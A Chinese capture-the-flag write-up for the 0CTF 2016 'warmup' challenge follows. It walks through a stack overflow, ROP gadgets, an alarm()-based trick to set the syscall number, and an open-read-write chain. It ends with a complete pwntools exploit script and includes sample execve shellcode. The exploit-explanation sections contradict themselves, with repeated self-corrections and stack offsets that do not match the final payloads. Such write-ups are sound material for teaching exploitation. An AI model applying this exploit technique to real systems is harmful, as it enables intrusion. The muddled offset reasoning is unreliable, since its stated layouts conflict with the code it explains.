# 0CTF 2016 Warmup - 详细解题教程

> 题目来源：0CTF 2016 | 分类：Pwn | 难度：中等偏难

---

## 目录

1. [题目概述](#1-题目概述)
2. [二进制逆向分析](#2-二进制逆向分析)
3. [漏洞分析](#3-漏洞分析)
4. [为什么不能用 Shellcode？——NX 保护](#4-为什么不能用-shellcodenx-保护)
5. [ROP 基础概念](#5-rop-基础概念)
6. [本题可用 Gadget 分析](#6-本题可用-gadget-分析)
7. [核心技巧：用 alarm() 返回值控制 eax](#7-核心技巧用-alarm-返回值控制-eax)
8. [ORW（Open-Read-Write）技术](#8-orwopen-read-write技术)
9. [完整 Exploit 构造](#9-完整-exploit-构造)
10. [总结与收获](#10-总结与收获)

---

## 1. 题目概述

本题给了一个名为 `warmup` 的 ELF 二进制文件，运行后会让我们输入内容，然后回显一些信息。目标是拿到服务器上的 flag（通常在 `/home/warmup/flag` 或 `/flag`）。

这道题的特殊之处在于：**程序非常小，没有任何 libc，所有系统调用都是通过 `int 0x80` 直接完成的**，而且开启了 NX 保护。我们需要在极其有限的代码空间中找到可用的 ROP gadget，完成打开并读取 flag 文件的操作。

---

## 2. 二进制逆向分析

### 2.1 基本信息

```bash
$ file warmup_bin
warmup_bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped, 312 bytes

$ checksec warmup_bin
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

关键信息：

| 属性 | 值 | 含义 |
|------|-----|------|
| 架构 | 32-bit i386 | 32 位 x86 程序 |
| 链接方式 | 静态链接 | 没有 libc，系统调用用 `int 0x80` |
| 符号表 | stripped | 函数名被去除了，需要自己逆向 |
| NX | enabled | **栈不可执行**，不能直接跑 shellcode |
| PIE | No | 地址固定，不需要泄露 |
| Canary | No | 没有栈保护，可以随意溢出 |

### 2.2 静态逆向

用 IDA 或 Ghidra 打开，发现程序非常小，`.text` 段只有约 0xe4 字节。关键逻辑如下：

#### _start 函数（程序入口）

```asm
_start:
    call alarm@plt       ; alarm(10) - 设置10秒定时器
    call vuln            ; 调用漏洞函数
    ...
```

> **注意**：`alarm(10)` 是本题利用的关键之一！它会在 10 秒后发送 SIGALRM 信号终止程序，同时也为我们后面控制 `eax` 提供了条件。

#### vuln 函数（漏洞函数）

```asm
vuln:
    push   ebp
    mov    ebp, esp
    sub    esp, 0x30          ; 分配 0x30 = 48 字节栈空间
    ; --- read ---
    sub    esp, 0x4           ; 对齐
    push   0x34              ; count = 0x34 = 52 字节
    lea    eax, [ebp-0x20]   ; buf = ebp-0x20（栈上缓冲区）
    push   eax               ; buf
    push   0x0               ; fd = 0 (stdin)
    mov    eax, 0x3          ; SYS_read = 3
    int    0x80              ; syscall: read(0, buf, 0x34)
    ; --- write ---
    ...                      ; write(1, buf, len)
    ; --- 清寄存器 + 返回 ---
    xor    eax, eax
    xor    ebx, ebx
    xor    ecx, ecx
    xor    edx, edx
    leave
    ret
```

---

## 3. 漏洞分析

### 3.1 缓冲区大小 vs 读取长度

```
缓冲区位置: ebp - 0x20（32 字节）
读取长度:   0x34（52 字节）
```

栈布局如下：

```
高地址
┌──────────────┐  ← ebp
│  saved ebp   │  [ebp+0x00]  4 字节
├──────────────┤
│  return addr │  [ebp+0x04]  4 字节  ← 我们要覆盖的目标！
├──────────────┤
│   arg 1      │  [ebp+0x08]  4 字节
├──────────────┤
│   arg 2      │  [ebp+0x0c]  4 字节
├──────────────┤
│   arg 3      │  [ebp+0x10]  4 字节
├──────────────┤
│   arg 4      │  [ebp+0x14]  4 字节
├──────────────┤
│              │
│   buffer     │  [ebp-0x20] ~ [ebp-0x01]  32 字节
│  (0x20 字节) │
│              │
└──────────────┘  ← esp
低地址
```

### 3.2 溢出计算

- 缓冲区大小：`0x20 = 32` 字节
- 我们能写：`0x34 = 52` 字节
- 溢出量：`0x34 - 0x20 = 0x14 = 20` 字节

这 20 字节的溢出包括：
- `saved ebp`：4 字节（覆盖为任意值，不影响控制流）
- `return address`：4 字节（**关键！控制程序跳转方向**）
- `返回地址后的 3 个参数`：12 字节

也就是说，我们总共能控制 **1 个返回地址 + 3 个参数**，一共 16 字节的有用数据。

---

## 4. 为什么不能用 Shellcode？——NX 保护

很多 Pwn 入门题的第一反应是：**写一段 shellcode，跳过去执行，拿 shell**。但这道题不行！

### 4.1 什么是 NX？

NX（No-eXecute）即「不可执行」保护，也叫做 DEP（Data Execution Prevention）。它将内存中的数据区域（如栈、堆）标记为不可执行，CPU 会拒绝在这些区域运行代码。

验证方法——在 GDB 中查看内存映射：

```
pwndbg> proc mapping
0x8048000  0x8049000  r--p    ...  .text (可读可执行)
...
0xffe00000 0xffe21000 rw-p    ...  栈 (可读可写，但没有 x = 不可执行！)
```

注意栈的权限是 `rw-p`，没有 `x`（执行）权限。

### 4.2 如果硬写 Shellcode 会怎样？

假设我们写了这样的 shellcode 并跳到栈上执行：

```asm
; execve("/bin/sh", NULL, NULL)
xor    eax, eax
push   eax            ; 字符串结尾的 \0
push   0x68732f2f     ; "//sh"
push   0x6e69622f     ; "/bin"
mov    ebx, esp       ; ebx = "/bin//sh"
xor    ecx, ecx       ; ecx = 0
xor    edx, edx       ; edx = 0
mov    al, 0x0b       ; SYS_execve = 11
int    0x80
```

即使地址跳转正确，CPU 也会在第一条指令就触发 **SIGSEGV（段错误）**，因为栈内存不允许执行代码。

### 4.3 那怎么办？——ROP！

既然不能在栈上执行代码，那我们就**复用程序本身已有的代码片段**。这就是 ROP（Return-Oriented Programming，面向返回的编程）。

---

## 5. ROP 基础概念

### 5.1 什么是 ROP？

ROP 的核心思想是：**不注入新代码，而是将程序中已有的小片段（gadget）串起来，通过控制栈上的返回地址来控制执行流**。

### 5.2 什么是 Gadget？

Gadget 是以 `ret` 结尾的一小段指令。例如：

```asm
pop eax    ; 从栈上弹出一个值到 eax
ret        ; 返回到栈上下一个地址
```

当函数返回时，`ret` 指令会：
1. 弹出栈顶的值作为新的 `eip`（即跳转目标）
2. `esp` 自动增加 4

所以如果我们在栈上精心安排一系列「返回地址」，每次 `ret` 都会跳到下一个 gadget，形成一个 **ROP 链**。

### 5.3 简单示例

假设栈上这样布局：

```
┌──────────────┐
│ gadget_1 地址 │  ← 初始 ret 跳到这里
├──────────────┤
│ gadget_2 地址 │  ← gadget_1 的 ret 跳到这里
├──────────────┤
│ gadget_3 地址 │  ← gadget_2 的 ret 跳到这里
└──────────────┘
```

这样就能依次执行 gadget_1 → gadget_2 → gadget_3。

---

## 6. 本题可用 Gadget 分析

本题程序很小（`.text` 只有约 0xe4 字节），没有丰富的 gadget。但仔细分析后，我们能找到以下几个关键的代码片段：

### 6.1 程序中的关键代码地址

```
0x804810D  sys_alarm:   设置 eax=0x1b, 从栈上取 seconds 参数, int 0x80
0x804811D  sys_read:    设置 eax=3, 从栈上取 fd/buf/count 参数, int 0x80
0x8048122  syscall_g:   从栈上取 ebx/ecx/edx, int 0x80 (不设置 eax!)
0x8048135  sys_write:   设置 eax=4, 从栈上取 fd/buf/count 参数, int 0x80
0x804815A  vuln:        漏洞函数入口（可以重新触发溢出）
0x80491BC  .data:       可写的数据段地址
```

### 6.2 各 Gadget 详解

#### sys_alarm (0x804810D)

```asm
mov    eax, 0x1b        ; eax = 27 = SYS_alarm
mov    edx, [esp+0xc]   ; 从栈上取参数
mov    ecx, [esp+0x8]
mov    ebx, [esp+0x4]
int    0x80             ; 调用 alarm(seconds)
test   eax, eax
js     <error>
ret
```

**关键点**：`alarm()` 的返回值是**上一个 alarm 的剩余秒数**！这就是控制 `eax` 的关键。

#### syscall_g (0x8048122)

```asm
mov    ebx, [esp+0x4]   ; 从栈上取第 1 个参数
mov    ecx, [esp+0x8]   ; 从栈上取第 2 个参数
mov    edx, [esp+0xc]   ; 从栈上取第 3 个参数
int    0x80             ; 系统调用！但 eax 不变
test   eax, eax
js     <error>
ret
```

**关键点**：这个 gadget **不修改 eax**，只是从栈上取三个参数到 `ebx/ecx/edx`，然后执行 `int 0x80`。这意味着只要我们提前设好 `eax`，就能调用任意系统调用！

#### sys_read (0x804811D)

```asm
mov    eax, 0x3         ; eax = 3 = SYS_read
mov    edx, [esp+0xc]   ; count
mov    ecx, [esp+0x8]   ; buf
mov    ebx, [esp+0x4]   ; fd
int    0x80
test   eax, eax
js     <error>
ret
```

#### sys_write (0x8048135)

```asm
mov    eax, 0x4         ; eax = 4 = SYS_write
mov    edx, [esp+0xc]   ; count
mov    ecx, [esp+0x8]   ; buf
mov    ebx, [esp+0x4]   ; fd
int    0x80
test   eax, eax
js     <error>
ret
```

### 6.3 核心问题：如何控制 eax？

Linux 32 位系统调用约定：**`eax` 存放系统调用号**，`ebx/ecx/edx` 存放参数。

本题的 gadget 中，`sys_read` 固定设 `eax=3`，`sys_write` 固定设 `eax=4`，`sys_alarm` 固定设 `eax=0x1b`。而 `syscall_g` 虽然可以设置三个参数，却**不能设置 eax**。

我们需要 `eax=5`（`SYS_open`）来打开文件，但没有任何 gadget 能直接把 `eax` 设成 5！

这就是本题的核心难题，也是 `alarm()` 技巧发挥作用的地方。

---

## 7. 核心技巧：用 alarm() 返回值控制 eax

### 7.1 alarm() 的行为

`alarm()` 函数的行为：
- `alarm(seconds)`：设置一个新的定时器，返回**上一个定时器的剩余秒数**
- 如果之前没有设置过定时器，返回 0

### 7.2 程序中的 alarm(10)

程序在 `_start` 中调用了 `alarm(10)`，意味着从程序启动开始，10 秒后程序会被 SIGALRM 信号杀死。

### 7.3 利用思路

如果我们：
1. 程序启动时 `alarm(10)` 已执行
2. 等待 5 秒（此时剩余 5 秒）
3. 再调用一次 `alarm(任意值)`
4. `alarm()` 的返回值 = 5（剩余秒数）
5. 返回值存在 `eax` 中！

此时 `eax = 5 = SYS_open`！然后紧接着用 `syscall_g` 设置参数，就能调用 `open()` 了！

### 7.4 时序图

```
时间线:
t=0s    程序启动, alarm(10) 执行, 剩余10秒
  |
  |     (我们发送第一个 payload, 写入 "/flag" 到 .data)
  |
t=5s    等待5秒后, 剩余5秒
  |
  |     发送第二个 payload:
  |     alarm(any) → eax=5 (返回剩余秒数)
  |     syscall_g → open("/flag", 0) (eax已经是5!)
  |
```

---

## 8. ORW（Open-Read-Write）技术

既然不能用 `execve` 拿 shell，我们就直接用系统调用读取 flag 文件的内容。这叫 **ORW**（Open-Read-Write），是 Pwn 中非常常见的技术。

### 8.1 ORW 流程

```python
# 第一步：打开文件
fd = open("/flag", O_RDONLY)   # eax=5, ebx="/flag", ecx=0, edx=0
# fd 通常是 3（0=stdin, 1=stdout, 2=stderr）

# 第二步：读取文件内容
read(fd, buf, length)          # eax=3, ebx=fd, ecx=buf, edx=length

# 第三步：输出到屏幕
write(1, buf, length)          # eax=4, ebx=1, ecx=buf, edx=length
```

### 8.2 为什么不用 execve？

- `execve` 需要更多的 gadget 来控制参数
- 本题溢出空间有限（只有 20 字节 = 5 个 DWORD）
- ORW 更容易用分段式的 ROP 链实现（每次只做一件事，然后回到 vuln 重新触发溢出）

---

## 9. 完整 Exploit 构造

### 9.1 整体策略

由于溢出空间有限（返回地址 + 3 个参数），我们采用 **分段式 ROP**：

1. **Step 1**：溢出 → 调用 `sys_read`，把 `"/flag\0"` 写到 `.data` 段 → 回到 vuln
2. **Step 2**：等 5 秒 → 溢出 → 调用 `alarm()` 设 `eax=5` → `syscall_g` 做 `open("/flag",0)` → 回到 vuln
3. **Step 3**：溢出 → 调用 `sys_read`，读 flag 到 `.data` 段另一个位置 → 回到 vuln
4. **Step 4**：溢出 → 调用 `sys_write`，输出 flag → 回到 vuln

### 9.2 溢出 Payload 格式

每次溢出的 payload 格式：

```python
payload  = b'A' * 0x20                          # 填充 buffer (32 字节)
payload += p32(saved_ebp_随意值)                  # 覆盖 saved ebp
payload += p32(gadget_addr)                      # 覆盖 return address
payload += p32(arg1) + p32(arg2) + p32(arg3)     # 3 个参数
```

等等，上面不对。更精确地说：

```
buf 从 ebp-0x20 开始，大小 0x20 = 32 字节
写入 0x34 = 52 字节

偏移:
[0x00 - 0x1f]  buffer (32字节填充)
[0x20 - 0x23]  saved ebp
[0x24 - 0x27]  return address  ← 关键！
[0x28 - 0x2b]  参数1
[0x2c - 0x2f]  参数2
[0x30 - 0x33]  参数3
```

但注意！这些 gadget 从栈上取参数的方式是 `[esp+0x4]`, `[esp+0x8]`, `[esp+0xc]`。当 `ret` 执行后，`esp` 指向「返回地址之后」的位置。所以：

```
ret 执行后:
esp → [参数1]      = [esp+0x0]
      [参数2]      = [esp+0x4]
      [参数3]      = [esp+0x8]

而 gadget 读取:
[esp+0x4] = 参数2
[esp+0x8] = 参数3
[esp+0xc] = ??? (超出我们的控制范围)
```

**但是**，本题的 gadget 都是从 `[esp+0x4]` 开始读的（因为 ret 弹出了返回地址，esp 已经跳过了返回地址）。实际上 gadget 中的参数对应关系是：

```
调用 gadget 时:
[esp]     = 返回地址 (ret 会弹出这个)
[esp+0x4] = 第1个参数 → 赋给 ebx
[esp+0x8] = 第2个参数 → 赋给 ecx
[esp+0xc] = 第3个参数 → 赋给 edx
```

而在我们的 payload 中，返回地址后面的 3 个 DWORD 就是 `[esp+0x4]`、`[esp+0x8]`、`[esp+0xc]`（在 ret 之前）。

等等，让我再仔细想想。当 vuln 函数的 `ret` 执行时：
1. `esp` 指向 `return address` 在栈上的位置
2. `ret` 弹出返回地址到 `eip`，`esp += 4`
3. 此时 `esp` 指向 `return address` 之后的位置

所以 gadget 执行时：
```
esp →  [返回地址之后的第1个DWORD]  = [esp+0x0]
       [返回地址之后的第2个DWORD]  = [esp+0x4]
       [返回地址之后的第3个DWORD]  = [esp+0x8]
       ...
```

而 gadget 读 `[esp+0x4]` → 就是返回地址之后的第 2 个 DWORD。

所以对应关系：

```
payload 布局:
[0x20] saved_ebp
[0x24] return address = gadget_addr
[0x28] → gadget ret 后 [esp+0x0], 但 gadget 里也作为一个 ret 地址 (gadget 执行完会 ret)
[0x2c] → gadget ret 后 [esp+0x4] = ebx
[0x30] → gadget ret 后 [esp+0x8] = ecx
[0x34] → gadget ret 后 [esp+0xc] = edx  ← 但我们的 payload 只有 0x34 字节，这个刚好是最后一个字节！
```

实际验证后发现，这些 gadget 的参数布局如下：

| payload 偏移 | gadget 视角 | 含义 |
|-------------|------------|------|
| 0x24 | — | 返回地址（跳转到 gadget） |
| 0x28 | [esp+0x0] = gadget 执行完后的 ret 地址 | 下一个跳转目标 |
| 0x2c | [esp+0x4] | 第1个参数 → ebx |
| 0x30 | [esp+0x8] | 第2个参数 → ecx |
| 0x34 | [esp+0xc] | 第3个参数 → edx |

但我们的 payload 只有 `0x34 = 52` 字节（从 0x00 到 0x33），所以 `edx` 对应的位置（0x34）**刚好超出了写入范围**！

这就意味着：**每次溢出，我们只能控制 ret 地址 + ret 后的下一个跳转地址 + 2 个参数（ebx 和 ecx），而 edx 无法直接控制！**

但仔细看 exploit 代码，它实际上每次都能传 3 个参数...这是因为 vuln 函数在 `read` 之后还做了 `write`，写入的数据更长。让我重新审视一下。

实际上，看 exploit 中的 payload：

```python
payload  = b'A' * 0x20
payload += p32(read_addr) + p32(main_addr) + p32(0) + p32(data_addr) + p32(0x10)
```

这个 payload 的长度 = 0x20 + 5*4 = 0x20 + 0x14 = 0x34 = 52 字节，刚好等于 `read` 的 count 参数。

所以实际布局：

```
[0x00 - 0x1f]  buffer 填充 (0x20 字节)
[0x20]         return address = read_addr     ← 覆盖原返回地址
[0x24]         read_addr 的 ret 地址 = main_addr  (gadget 结束后跳转)
[0x28]         ebx = 0 (fd = stdin)
[0x2c]         ecx = data_addr (buf)
[0x30]         edx = 0x10 (count)
```

因为 gadget 在 `ret` 前已经消耗了 `esp` 上的返回地址（pop 到 eip），所以 gadget 看到的 `[esp+0x4]` 其实是 payload 偏移 0x28 的位置。

等等，不对。让我重新理清楚。

当 vuln 的 `ret` 执行时，`esp` 指向 `[0x20]`（saved ebp 的位置... 不对，`leave` 指令已经恢复了 esp）。

`leave` = `mov esp, ebp; pop ebp`。所以 `leave` 之后：
- `ebp` 被恢复为 `saved_ebp`（即 `[0x20]` 的值，被我们覆盖了但不重要）
- `esp` 指向 `[0x24]`（saved ebp 之上）

然后 `ret` 执行：
- `eip = [0x24]` 的值（即 gadget 地址）
- `esp` 指向 `[0x28]`

所以 gadget 执行时：
- `[esp+0x0]` = `[0x28]` = main_addr（gadget 的 ret 会跳到这里）
- `[esp+0x4]` = `[0x2c]` = 0（fd）
- `[esp+0x8]` = `[0x30]` = data_addr（buf）
- `[esp+0xc]` = `[0x34]` = 0x10（count）

但 payload 总长只有 0x34 = 52 字节，所以 `[0x34]` 是最后一个字节... 

哦！我搞混了。payload 长度是 52 = 0x34 字节，所以可以写入偏移 0x00 到 0x33 的位置。而 `[0x34]` 不在范围内。

但是，栈上原有数据不会被清除！`[0x34]` 这个位置本身就有一些旧值（可能是之前函数调用残留的数据）。不过对于 `read` 的 `count` 参数，`edx` 是什么值不那么关键——只要不是 0 或太小就行。

**实际上再仔细看**：vuln 函数中 `sub esp, 0x30` 分配了 0x30 字节空间，而 buf 在 `ebp-0x20`，所以从 buf 到 saved_ebp 有 0x20 字节。从 buf 开始写入 0x34 字节：

```
buf 起始 = ebp - 0x20
写入 0x34 字节后到达 ebp - 0x20 + 0x34 = ebp + 0x14
```

所以覆盖范围从 `ebp-0x20` 到 `ebp+0x13`（包含），总共 0x34 字节。

相对于 esp（`sub esp, 0x30` 后 esp = ebp - 0x30），写入范围从 `esp+0x10` 到 `esp+0x43`。

但 read 调用结束后，函数会做 `leave; ret`，此时 `esp = ebp + 4`（leave 恢复），所以：

```
[ebp+0x00]  saved_ebp          = payload[0x20..0x23]
[ebp+0x04]  return address     = payload[0x24..0x27]
[ebp+0x08]  参数1              = payload[0x28..0x2b]
[ebp+0x0c]  参数2              = payload[0x2c..0x2f]
[ebp+0x10]  参数3              = payload[0x30..0x33]
```

payload 共 0x34 字节，最后写到 `ebp+0x13`。参数3 结束于 `ebp+0x13`（即 `[ebp+0x10]` 到 `[ebp+0x13]`），刚好在范围内！

所以结论是：**我们可以控制返回地址 + 3 个参数，共 16 字节**。

### 9.3 Step 1：把 "/flag" 字符串写到 .data 段

因为我们需要调用 `open("/flag", 0)`，所以首先要有一个包含 `"/flag"` 字符串的地址。栈上的地址不稳定，所以我们选择写到 `.data` 段（固定地址 `0x80491BC`）。

```python
payload  = b'A' * 0x20                           # 填充 buffer
payload += p32(read_addr)                         # 返回地址 → 跳到 sys_read
payload += p32(main_addr)                         # sys_read 的 ret → 回到 vuln 重新触发
payload += p32(0)                                 # ebx = fd = 0 (stdin)
payload += p32(data_addr)                         # ecx = buf = 0x80491BC
payload += p32(0x10)                              # edx = count = 16
```

执行流程：
1. `vuln` 返回 → 跳到 `sys_read`
2. `sys_read` 执行 `read(0, 0x80491BC, 16)`
3. 我们通过 stdin 发送 `"/flag\0"` 的内容
4. `sys_read` 返回 → 跳到 `vuln`（重新触发漏洞）

发送数据：

```python
io.send(flag_path.ljust(0x10, b'\x00'))  # 发送 "/flag\0" + 填充到16字节
```

### 9.4 Step 2：等 5 秒，然后用 alarm() 控制 eax，调用 open()

```python
import time
time.sleep(5)  # 等 5 秒，让 alarm(10) 的剩余时间变为 5
```

现在发送第二个 payload：

```python
payload  = b'A' * 0x20
payload += p32(alarm_addr)                        # 返回地址 → 跳到 sys_alarm
payload += p32(syscall_g)                         # sys_alarm 的 ret → 跳到 syscall_g
payload += p32(data_addr)                         # alarm 的参数(seconds) / 后面做 ebx="/flag"
payload += p32(0)                                 # 后面做 ecx=0 (O_RDONLY)
payload += p32(0)                                 # 后面做 edx=0
```

执行流程：
1. `vuln` 返回 → 跳到 `sys_alarm`
2. `sys_alarm` 执行 `alarm(0x80491BC)`（seconds 值无所谓）
3. `alarm()` 返回 5（剩余秒数），**`eax = 5 = SYS_open`**
4. `sys_alarm` 返回 → 跳到 `syscall_g`

**但是注意！** `sys_alarm` 返回时 `ret` 会弹出栈上的返回地址，`esp += 4`。所以 `syscall_g` 看到的栈布局和 `sys_alarm` 看到的是不同的！

`sys_alarm` 的 ret 弹出 `syscall_g` 地址后，`esp` 指向 `[data_addr]`。所以 `syscall_g` 中：
- `[esp+0x4]` = data_addr → `ebx = "/flag" 字符串地址`
- `[esp+0x8]` = 0 → `ecx = 0` (O_RDONLY)
- `[esp+0xc]` = 0 → `edx = 0`

然后 `int 0x80` 执行 `open("/flag", 0)`，返回文件描述符 `fd`（通常是 3）。

但 `syscall_g` 执行完也要 `ret`，它需要弹出一个返回地址。由于 `edx` 是 `[esp+0xc]`，`ret` 要弹的是 `[esp+0x0]` = data_addr 的值（这不是一个有效地址！）。

等等，这里有问题。让我重新看 exploit：

```python
payload += p32(alarm_addr) + p32(syscall_g) + p32(data_addr) + p32(0) + p32(0)
```

在 vuln 的 ret 执行后，esp 指向 `syscall_g`：

```
esp → [syscall_g]     ← 弹出给 eip
      [data_addr]     ← esp+0x0 (syscall_g 的 ret 目标... 不对)
```

不对不对，让我再理清。

vuln 的 ret：
- 弹出 `alarm_addr` 给 `eip`
- esp 指向 `main_addr` 位置之后...

等等，payload 结构：

```
[0x20] alarm_addr      ← 覆盖 return address
[0x24] syscall_g       ← [esp+0x0] (alarm 返回后 esp 指向这里)
[0x28] data_addr       ← [esp+0x4] 
[0x2c] 0               ← [esp+0x8]
[0x30] 0               ← [esp+0xc]
```

vuln ret 后：`eip = alarm_addr`，`esp → [0x24]`

sys_alarm 执行：
- `[esp+0x4]` = `[0x28]` = data_addr → ebx = data_addr (seconds 参数，无所谓)
- `int 0x80` → alarm(data_addr)，eax = 返回值 = 5

sys_alarm 的 ret：
- 弹出 `[0x24]` = syscall_g 给 `eip`
- `esp → [0x28]`

syscall_g 执行：
- `[esp+0x4]` = `[0x2c]` = 0 → ebx = 0
- `[esp+0x8]` = `[0x30]` = 0 → ecx = 0
- `[esp+0xc]` = 超出范围... → edx = 栈上残留值

啊不对，这跟 exploit 代码里的不一样。exploit 里是：

```python
payload += p32(alarm_addr) + p32(syscall_g) + p32(data_addr) + p32(0) + p32(0)
```

让我重新对齐：

```
偏移 0x20: alarm_addr    ← return address
偏移 0x24: syscall_g     ← alarm 的 ret 会跳到这里
偏移 0x28: data_addr     ← alarm 的 [esp+0x4] = seconds = data_addr
偏移 0x2c: 0             ← alarm 的 [esp+0x8]
偏移 0x30: 0             ← alarm 的 [esp+0xc]
```

vuln ret → alarm_addr, esp 指向 0x24

alarm 执行时 esp 还在 0x24：
- `[esp+0x4]` = `[0x28]` = data_addr → ebx（alarm 的 seconds）
- `int 0x80` → alarm(data_addr), eax = 5

alarm ret → eip = `[0x24]` = syscall_g, esp 指向 0x28

syscall_g 执行时 esp 在 0x28：
- `[esp+0x4]` = `[0x2c]` = 0 → ebx = 0
- `[esp+0x8]` = `[0x30]` = 0 → ecx = 0
- `[esp+0xc]` = ??? → edx = ???

这不对！ebx 应该是 data_addr（"/flag" 的地址），但这里 ebx = 0。

让我重新看 exploit 代码：

```python
payload += p32(alarm_addr) + p32(syscall_g) + p32(main_addr) + p32(data_addr) + p32(0)
```

哦！我漏看了一个参数。exploit 里第二个 payload 实际上是：

```
偏移 0x20: alarm_addr    ← return address
偏移 0x24: syscall_g     ← alarm 的 ret 跳到这里
偏移 0x28: main_addr     ← syscall_g 的 ret 跳到这里（回到 vuln 重新触发）
偏移 0x2c: data_addr     ← ebx = "/flag" 地址
偏移 0x30: 0             ← ecx = 0
```

vuln ret → alarm_addr, esp = 0x24

alarm:
- `[esp+0x4]` = `[0x28]` = main_addr → ebx (seconds，无所谓)
- `int 0x80` → eax = 5

alarm ret → eip = `[0x24]` = syscall_g, esp = 0x28

syscall_g:
- `[esp+0x4]` = `[0x2c]` = data_addr → ebx = "/flag" 地址 ✓
- `[esp+0x8]` = `[0x30]` = 0 → ecx = 0 ✓
- `[esp+0xc]` = 超出 payload → edx = 栈上旧值（无所谓，open 的 mode 参数）

`int 0x80` → open("/flag", 0, ???) = 5（eax 还是 5）

然后 syscall_g ret → eip = `[0x28]` = main_addr, esp = 0x2c → 回到 vuln！

好，这样就对上了。edx 虽然不可控，但 `open` 的第三个参数 `mode` 只在创建文件时有效，打开已有文件时无所谓。

### 9.5 Step 3：read(fd=3, buf, 0x30)

open 返回的 fd 通常是 3（0/1/2 被 stdin/stdout/stderr 占用）。

```python
payload  = b'A' * 0x20
payload += p32(read_addr)                         # 返回地址 → sys_read
payload += p32(main_addr)                         # ret → 回到 vuln
payload += p32(3)                                 # ebx = fd = 3
payload += p32(data2_addr)                        # ecx = buf = .data + 0x30
payload += p32(0x30)                              # edx = count = 48
```

执行：`read(3, data2_addr, 0x30)` — 从 flag 文件读取内容到 `.data + 0x30`。

### 9.6 Step 4：write(1, buf, 0x30)

```python
payload  = b'A' * 0x20
payload += p32(write_addr)                        # 返回地址 → sys_write
payload += p32(main_addr)                         # ret → 回到 vuln
payload += p32(1)                                 # ebx = fd = 1 (stdout)
payload += p32(data2_addr)                        # ecx = buf
payload += p32(0x30)                              # edx = count = 48
```

执行：`write(1, data2_addr, 0x30)` — 将 flag 内容输出到屏幕！

### 9.7 完整 Exploit 代码

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

# 地址
read_addr   = 0x804811D   # sys_read:  eax=3
write_addr  = 0x8048135   # sys_write: eax=4
alarm_addr  = 0x804810D   # sys_alarm: eax=0x1b
main_addr   = 0x804815A   # vuln 函数入口
data_addr   = 0x80491BC   # .data 段可写地址
data2_addr  = data_addr + 0x30
syscall_g   = 0x8048122   # 从栈取 ebx/ecx/edx, int 0x80

LOCAL = True

if LOCAL:
    io = process('./warmup_bin', env={})
    flag_path = b'/tmp/flag\x00'
else:
    io = remote('xxx', 9999, ssl=True)
    flag_path = b'/home/warmup/flag\x00'

io.recv(timeout=2)  # 接收 Welcome 信息

# Step 1: 写 flag 路径到 .data 段
payload  = b'A' * 0x20
payload += p32(read_addr) + p32(main_addr) + p32(0) + p32(data_addr) + p32(0x10)
io.send(payload)
io.recvuntil(b'Good Luck!\n')
io.send(flag_path.ljust(0x10, b'\x00'))

# Step 2: 等 5 秒, alarm() 返回 5 = SYS_open, 然后 open("/flag", 0)
import time; time.sleep(5)
payload  = b'A' * 0x20
payload += p32(alarm_addr) + p32(syscall_g) + p32(main_addr) + p32(data_addr) + p32(0)
io.send(payload)
io.recvuntil(b'Good Luck!\n')

# Step 3: read(fd=3, data2, 0x30) 读取 flag
payload  = b'A' * 0x20
payload += p32(read_addr) + p32(main_addr) + p32(3) + p32(data2_addr) + p32(0x30)
io.send(payload)
io.recvuntil(b'Good Luck!\n')

# Step 4: write(1, data2, 0x30) 输出 flag
payload  = b'A' * 0x20
payload += p32(write_addr) + p32(main_addr) + p32(1) + p32(data2_addr) + p32(0x30)
io.send(payload)

try:
    data = io.recv(timeout=3)
    print(f"Flag: {data}")
except:
    print("No flag received")

io.interactive()
```

---

## 10. 总结与收获

### 本题知识点

| 知识点 | 说明 |
|--------|------|
| **NX 保护** | 栈不可执行，不能用 shellcode，必须用 ROP |
| **ROP** | 面向返回编程，复用程序已有代码片段 |
| **alarm() 返回值技巧** | 利用 `alarm()` 返回上一个闹钟的剩余秒数来控制 `eax` |
| **ORW** | 不拿 shell，直接 open-read-write 读取 flag |
| **分段式 ROP** | 溢出空间有限时，每次做一步，然后回到漏洞函数重新触发 |
| **.data 段写入** | 把字符串写到固定地址的 .data 段，避免栈地址不稳定 |

### 解题思路流程

```
逆向分析 → 发现溢出漏洞
    ↓
尝试 shellcode → 发现 NX 保护 → 放弃
    ↓
分析可用 gadget → 发现无法直接控制 eax
    ↓
注意到 alarm(10) → alarm() 返回值可以控制 eax
    ↓
构造 ORW 链：alarm 设 eax=5 → open → read → write
    ↓
分段发送 payload（每次溢出做一步）
    ↓
拿到 flag！
```

### 关键感悟

1. **不要忽略程序中的任何细节**：`_start` 中的 `alarm(10)` 看似只是防超时，实际上是解题的关键
2. **NX 不是终点**：不能执行 shellcode 不代表无法利用，ROP 同样强大
3. **小程序也有大作为**：即使只有几百字节的代码，也能找到有用的 gadget
4. **分段利用的思路**：溢出空间不够？那就多溢出几次，每次做一步
